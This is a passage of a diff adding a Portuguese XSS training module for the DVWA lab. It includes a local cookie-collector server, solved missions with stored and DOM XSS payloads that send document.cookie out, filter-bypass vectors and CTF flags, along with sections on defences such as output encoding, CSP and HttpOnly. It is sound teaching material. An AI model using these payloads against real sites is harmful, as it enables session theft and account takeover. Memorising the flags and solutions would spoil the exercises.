+def flag(seed): return "FLAG{" + hashlib.sha256(seed.encode()).hexdigest()[:12] + "}"
+
+class H(http.server.BaseHTTPRequestHandler):
+    def log_message(self, *a): pass
+    def do_GET(self):
+        u = urllib.parse.urlparse(self.path)
+        c = urllib.parse.unquote(urllib.parse.parse_qs(u.query).get("c", [""])[0])
+        out = ""
+        if u.path == "/s" and "security=low" in c and SID.search(c):
+            out = flag("dvwa|xss-stored|cookie-theft|v1")
+            print(f"[armazenado] cookie roubado: {c}\\n  -> {out}")
+        elif u.path == "/d" and SID.search(c):
+            out = flag("dvwa|xss-dom|document-write|v1")
+            print(f"[dom] execucao no navegador, cookie: {c}\\n  -> {out}")
+        else:
+            print(f"[beacon ignorado] {self.path}")
+        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers()
+        self.wfile.write(out.encode() or b"ok")
+
+http.server.HTTPServer(("127.0.0.1", 8099), H).serve_forever()`} />
+
+Rode-o num terminal do Kali e deixe aberto:
+
+```console
+$ python3 coletor.py
+```
+
+**Agora o payload.** Você precisa que o guestbook guarde algo como:
+
+```javascript
+<script>new Image().src="http://127.0.0.1:8099/s?c="+encodeURIComponent(document.cookie)</script>
+```
+
+Só que o campo **Message** tem `maxlength="50"` e o **Name** tem `maxlength="10"`.
+Seu desafio é plantar o payload apesar disso. Pense: de onde vem esse limite? O
+que em 4.1/2.5 permite ignorá-lo?
+
+<Hint title="Dica 1 — o limite é só no navegador">
+`maxlength` é um atributo HTML — ele só impede a digitação no campo. O servidor
+não reaplica o limite. Então mande o POST **sem passar pelo formulário**: pelo
+Repeater do Burp (2.5) ou por `curl`, com o corpo que você quiser. O payload pode
+ir no `mtxMessage` à vontade.
+</Hint>
+
+<Hint title="Dica 2 — não esqueça o token">
+O POST do guestbook também leva o `user_token`. Pegue o token atual da página
+`xss_s` e inclua no corpo, como você fez no login.
+</Hint>
+
+<Solution title="Solução — plantar por curl e disparar o beacon">
+Plante o payload mandando o POST direto (furando o `maxlength`):
+
+```console
+$ TOK=$(curl -s -b cookies.txt "http://dvwa/vulnerabilities/xss_s/" \
+    | grep -oP "user_token' value='\K[0-9a-f]{32}")
+$ curl -s -b cookies.txt \
+    --data-urlencode 'txtName=atacante' \
+    --data-urlencode 'mtxMessage=<script>new Image().src="http://127.0.0.1:8099/s?c="+encodeURIComponent(document.cookie)</script>' \
+    --data-urlencode 'btnSign=Sign Guestbook' \
+    --data-urlencode "user_token=$TOK" \
+    "http://dvwa/vulnerabilities/xss_s/" -o /dev/null -w "plantado: %{http_code}\n"
+plantado: 200
+```
+
+Confirme que ele ficou gravado **cru** (sem virar `&lt;script&gt;`):
+
+```console
+$ curl -s -b cookies.txt "http://dvwa/vulnerabilities/xss_s/" | grep -o 'Image().*</script>' | head -1
+Image().src="http://127.0.0.1:8099/s?c="+encodeURIComponent(document.cookie)</script>
+```
+
+Agora **visite a página do guestbook no navegador do Kali** (a vítima é você
+mesmo, logado). Ao carregar, o `<script>` armazenado executa e dispara o beacon.
+No terminal do coletor, aparece a sessão roubada e a flag:
+
+```console
+[armazenado] cookie roubado: security=low; PHPSESSID=c7701edbc98a59c0bfdd0acf8646d2d9
+  -> FLAG{478c8569a516}
+```
+
+(Esse `PHPSESSID` é um exemplo; o seu será outro. A flag é fixa.) Você acabou de
+executar o fluxo inteiro do diagrama da seção 3.2: plantar → vítima abre →
+navegador executa → cookie exfiltrado.
+</Solution>
+
+Cole no campo abaixo a flag que o coletor imprimiu.
+
+<FlagInput task="missao-1-armazenado" />
+
+### 5.4 Missão 2 (desafio) — DOM XSS pelo `document.write`
+
+Vá para a página **XSS (DOM)**. Como você viu em 3.3, o JavaScript dela lê tudo
+depois de `default=` na URL e joga em `document.write`, sem tratar. Seu objetivo:
+fazer esse sink disparar um beacon para o coletor, no caminho `/d`, provando
+execução **sem o servidor ver o payload**.
+
+<Hint title="Dica 1 — primeiro, só execute">
+Antes de exfiltrar, confirme a execução: acesse
+`http://dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>`. O `alert`
+aparece porque o `document.write` escreve o `<script>` durante o parsing. Com
+isso confirmado, troque o `alert` por algo útil.
+</Hint>
+
+<Hint title="Dica 2 — payload cru, sem percent-encoding">
+O código faz `decodeURI(lang)`, mas escreve `lang` **cru** na parte da marcação,
+e `decodeURI` **não** desfaz `%3C`/`%3E`. Então **não** percent-encode o payload:
+ele tem de ir literal na URL (digite-o na barra de endereços, não o cole
+já escapado).
+</Hint>
+
+<Solution title="Solução — beacon pelo sink do DOM">
+Com o `coletor.py` rodando, acesse no navegador do Kali (tudo numa linha, cru na
+barra de endereços):
+
+```text
+http://dvwa/vulnerabilities/xss_d/?default=<script>new Image().src="http://127.0.0.1:8099/d?c="+encodeURIComponent(document.cookie)</script>
+```
+
+O `document.write` escreve o seu `<script>` no documento, ele executa e o beacon
+sai. No coletor:
+
+```console
+[dom] execucao no navegador, cookie: security=low; PHPSESSID=c7701edbc98a59c0bfdd0acf8646d2d9
+  -> FLAG{81e9c0f78bc6}
+```
+
+Note a diferença para a Missão 1: aqui o payload está só na URL do navegador; se
+você o tivesse posto depois de um `#`, o servidor do DVWA **nem registraria** o
+valor no log. É o XSS que vive no cliente.
+</Solution>
+
+Cole a flag da Missão 2 abaixo.
+
+<FlagInput task="missao-2-dom" />
+
+### 5.5 Desligar o laboratório
+
+No painel do lab, clique em **Parar** (libera a vaga de um lab por vez). Se quiser
+refazer do zero, **Resetar** zera o guestbook (apaga seus comentários plantados).
+Pelo terminal: `scripts/lab.sh down dvwa`.
+
+## 6. Variações e aprofundamento
+
+### 6.1 Furando filtros: os níveis `medium` e `high` do DVWA
+
+O nível `low` não filtra nada. Os outros mostram por que **blocklist não defende
+XSS**. Este é o código **real** de cada nível do refletido (lido pelo *View
+Source* do DVWA):
+
+```php
+// medium: remove a string exata "<script>", uma vez, sensível a maiúsculas
+$name = str_replace( '<script>', '', $_GET[ 'name' ] );
+
+// high: remove qualquer coisa parecida com "<script" (mesmo com letras no meio)
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+
+// impossible: codifica a saída — o conserto de verdade
+$name = htmlspecialchars( $_GET[ 'name' ] );
+```
+
+O `medium` cai de três jeitos: trocar a caixa (`<ScRiPt>`), aninhar
+(`<scr<script>ipt>` — ao remover o `<script>` do meio, sobra outro `<script>`) ou
+**nem usar a palavra script** — um `<img src=x onerror=alert(1)>` dispara JS pelo
+atributo `onerror` e não contém `<script>`. O `high` barra qualquer `<script`,
+mas também morre para o `<img onerror>` / `<svg onload=alert(1)>`: há dezenas de
+tags e atributos que executam JS. **Quem defende por lista de proibidos tem de
+acertar todos; quem ataca precisa de um só.**
+
+<Callout variant="warning" title="A mesma lição no DOM">
+O `medium` do DOM XSS faz `stripos($default, "<script")` e redireciona se achar —
+e cai para `</option></select><img src=x onerror=alert(1)>`. O `high` usa uma
+*whitelist* de idiomas (English, French, Spanish, German) no servidor, o que é
+muito melhor; mesmo assim, por ser DOM, dá para abusar com o fragmento
+(`?default=English#…`), já que o sink lê o `href` inteiro. A cura está no sink,
+não na lista.
+</Callout>
+
+### 6.2 Além do cookie: o que um XSS faz de verdade
+
+Roubar a sessão é só o começo. Com execução no contexto do site, o atacante pode:
+
+- **Agir como a vítima** — fazer requisições autenticadas (trocar o e-mail da
+  conta, transferir, postar), com o token anti-CSRF que ele lê da própria página.
+  XSS **derrota** a proteção de CSRF, porque o ataque roda de dentro do site.
+- **Keylogger e phishing na página** — capturar o que a vítima digita ou
+  reescrever a tela pedindo a senha (um formulário falso no domínio verdadeiro).
+- **<GlossaryTerm term="BeEF">BeEF</GlossaryTerm>** (Browser Exploitation
+  Framework) — prende o navegador e oferece um painel de ações; mostra o quanto
+  um XSS é uma cabeça de ponte, não um fim.
+
+### 6.3 Blind XSS, mXSS e self-XSS
+
+- **<GlossaryTerm term="blind XSS">Blind XSS</GlossaryTerm>** — o payload dispara
+  onde você não vê (um painel interno, a tela de um atendente). Confirma-se com um
+  beacon de volta ao seu coletor — exatamente o que você montou no lab.
+- **<GlossaryTerm term="mutation XSS (mXSS)">Mutation XSS</GlossaryTerm>** — o
+  navegador reescreve o HTML ao reparsear o DOM e "ressuscita" um payload que o
+  sanitizador achava inofensivo. É o motivo de não escrever sanitizador próprio.
+- **<GlossaryTerm term="self-XSS">Self-XSS</GlossaryTerm>** — convencer a vítima a
+  colar o payload no console do próprio navegador. Não é falha da aplicação; é
+  engenharia social, e é por isso que o DevTools avisa ao abrir.
+
+## 7. Erros comuns
+
+- **"Mandei `<script>` e nada aconteceu."** Veja o contexto (seção 2.3): se a
+  entrada caiu dentro de um atributo (`value="AQUI"`), um `<script>` solto não
+  executa — você precisa **fechar a aspa e a tag** primeiro (`"><script>…`).
+  Confirme no HTML da resposta onde exatamente a sua entrada aterrissou.
+- **"O `alert` abriu, mas o cookie veio vazio."** O cookie é `HttpOnly` — e aí
+  `document.cookie` não o enxerga (é a defesa funcionando). No DVWA ele não é, mas
+  num alvo real pode ser; mude o objetivo para uma ação autenticada.
+- **"Plantei o payload mas o coletor não recebeu nada."** Três suspeitos: (1) o
+  `coletor.py` não está rodando ou escuta noutra porta; (2) você percent-encodou o
+  payload no DOM e o `decodeURI` não o desfez — mande cru; (3) no armazenado, o
+  `maxlength` truncou porque você digitou no formulário em vez de mandar o POST
+  direto.
+- **"Funciona no `low`, trava no `medium`."** É de propósito. Releia 6.1: troque a
+  caixa ou use um vetor sem a palavra `script` (`<img src=x onerror=…>`).
+- **"O DOM XSS não aparece no log do servidor."** Não é bug — é a natureza do DOM
+  XSS. Procure a falha no **JavaScript do cliente**, rastreando a source até o
+  sink.
+
+## 8. Defesa e mitigação
+
+A regra de ouro espelha a da SQLi: **não deixe a entrada ser interpretada como
+código.** Lá era parametrizar a query; aqui é **codificar a saída** no contexto
+certo. As camadas, da cura às redes de proteção:
+
+### 8.1 Codificação de saída sensível ao contexto (a cura)
+
+Antes de inserir qualquer dado não confiável no HTML, codifique-o para aquele
+contexto. No contexto HTML, isso é transformar os caracteres de marcação em
+entidades. É o que o nível `impossible` do DVWA faz:
+
+```php
+// VULNERÁVEL — a entrada vira marcação
+echo "<pre>Hello " . $_GET['name'] . "</pre>";
+
+// SEGURO — a entrada vira texto; < e > viram &lt; e &gt;
+echo "<pre>Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</pre>";
+```
+
+Com <GlossaryTerm term="htmlspecialchars">htmlspecialchars</GlossaryTerm> (e
+`ENT_QUOTES`, que também codifica `'` e `"`, cobrindo o
+contexto de atributo), `<script>` chega ao navegador como o **texto**
+`&lt;script&gt;` e nada executa. Cada linguagem tem a sua função; o que não muda é
+a ideia: **codifique na saída, no contexto onde o dado vai cair.** Para o contexto
+JavaScript ou URL, use a codificação daquele contexto — não a HTML.
+
+A boa notícia: **frameworks modernos fazem isso por padrão.** React (`{valor}`),
+Angular, Vue e os template engines (Jinja, Twig, Razor) escapam a saída
+automaticamente. O XSS volta quando o desenvolvedor sai do caminho seguro — o
+`dangerouslySetInnerHTML` do React, o `v-html` do Vue, o `|safe` do Jinja,
+`innerHTML` no JS cru. **Trate essas APIs como a interpolação de SQL cru: só com
+dado já higienizado.**
+
+### 8.2 Quando você precisa aceitar HTML: sanitize com biblioteca
+
+Às vezes a aplicação **precisa** aceitar HTML do usuário (um editor de texto
+rico). Aí não dá para só codificar — você quer que `<b>` funcione. A resposta é
+**sanitizar** com uma biblioteca testada, nunca com regex própria (lembre do
+mXSS):
+
+```javascript
+import DOMPurify from "dompurify";
+element.innerHTML = DOMPurify.sanitize(userHtml); // remove <script>, onerror, etc.
+```
+
+<GlossaryTerm term="DOMPurify">DOMPurify</GlossaryTerm> deixa a marcação segura e
+remove o que executa. É a diferença entre "permitir formatação" e "permitir
+código".
+
+### 8.3 Content Security Policy (defesa em profundidade)
+
+A <GlossaryTerm term="Content Security Policy (CSP)">Content Security Policy</GlossaryTerm>
+é um cabeçalho que diz ao navegador de onde ele pode executar script. Com uma CSP
+restritiva, **mesmo que haja um XSS**, o navegador se recusa a rodar o script
+injetado:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'
+```
+
+A chave é **não usar `'unsafe-inline'`**: scripts inline só rodam se trouxerem o
+`nonce` (um valor aleatório por resposta que o atacante não adivinha) ou um hash
+conhecido. Foi o que faltou à British Airways (seção 4): uma CSP que não deixasse
+o script enviar dados a um domínio estranho teria cortado o skimming. A CSP é
+poderosa, mas é **camada extra** — ela reduz o impacto, não conserta a falta de
+codificação.
+
+### 8.4 Cookies e `Trusted Types`
+
+- **`HttpOnly`** no cookie de sessão: tira o cookie do alcance de
+  `document.cookie`. Corta o roubo de sessão (o passo 4 do diagrama), embora o
+  XSS ainda execute. É barato e deve ser padrão.
+- **`SameSite`** e **`Secure`**: reduzem o reuso do cookie em contextos
+  cross-site e fora de HTTPS (defesa que conversa com o CSRF, de 4.x).
+- **<GlossaryTerm term="Trusted Types">Trusted Types</GlossaryTerm>** (via CSP `require-trusted-types-for 'script'`): proíbe
+  passar string crua para sinks como `innerHTML`, fechando o **DOM XSS** pela
+  raiz. É o estado da arte para aplicações JavaScript pesadas.
+
+### 8.5 Como detectar
+
+Procure, no código, cada ponto em que entrada vira saída sem codificação
+(`echo $_GET`, `innerHTML =`, `document.write`, `dangerouslySetInnerHTML`). No
+dinâmico, mande um marcador único (`xss7h3r3<>"'`) nos campos e veja onde ele
+volta **cru** na resposta ou no DOM. É o que ferramentas como o scanner do Burp
+automatizam — mas entender o contexto, como você fez aqui, é o que separa o falso
+positivo do achado real.
+
+## 9. Exercícios
+
+A tarefa prática que gera as flags é a da seção 5: a **Missão 1** (XSS armazenado
+com roubo de sessão) e a **Missão 2** (DOM XSS). Se ainda não as completou, volte
+ao lab — a flag só aparece quando o ataque funciona.
+
+Para fixar a teoria, responda o quiz. Ele é corrigido no servidor (o gabarito não
+vai ao navegador) e conta para concluir o módulo.
+
+<Quiz task="quiz-final" />
+
+**Desafios extras (sem flag, para pensar):**
+
+- No nível `medium` do refletido, obtenha execução **sem** usar a palavra
+  `script`. Qual atributo você usou? Por que o filtro não o pegou?
+- A página do guestbook mostra o nome e a mensagem. Em qual **contexto** (corpo,
+  atributo?) cada um cai? Isso muda o payload necessário?
+- Se o cookie de sessão fosse `HttpOnly`, o seu payload da Missão 1 falharia. Qual
+  **outro** objetivo (sem ler o cookie) ainda seria possível com o mesmo XSS?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- XSS é injeção cujo interpretador é o **navegador da vítima**: entrada não
+  confiável vira marcação/código porque a aplicação não **codifica a saída**.
+- Três famílias: **refletido** (volta no pedido, atinge quem clica),
+  **armazenado** (salvo no servidor, atinge todos — o mais grave) e **DOM** (vive
+  no cliente, o servidor não vê — o mais sorrateiro).
+- O impacto real vai muito além do `alert`: roubo de sessão (se o cookie não é
+  `HttpOnly`), ações autenticadas (derrota o CSRF), keylogger, phishing na
+  página, web skimming.
+- **Contexto é tudo**: o payload e a codificação dependem de onde a entrada cai
+  (corpo, atributo, `<script>`, URL, DOM).
+- **Blocklist não defende** (o worm Samy e os níveis `medium`/`high` do DVWA
+  provam). A cura é **codificação de saída** no contexto certo (`htmlspecialchars`
+  e, por padrão, os frameworks modernos); as camadas extras são **CSP** sem
+  `unsafe-inline`, **HttpOnly**/`SameSite`, sanitização (DOMPurify) e
+  **Trusted Types**.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) — a referência da comunidade sobre a falha.
+- [OWASP Cheat Sheet — Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — a régua de defesa por contexto.
+- [OWASP Cheat Sheet — DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) — sources, sinks e Trusted Types.
+- [MDN — Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) — a documentação oficial do cabeçalho.
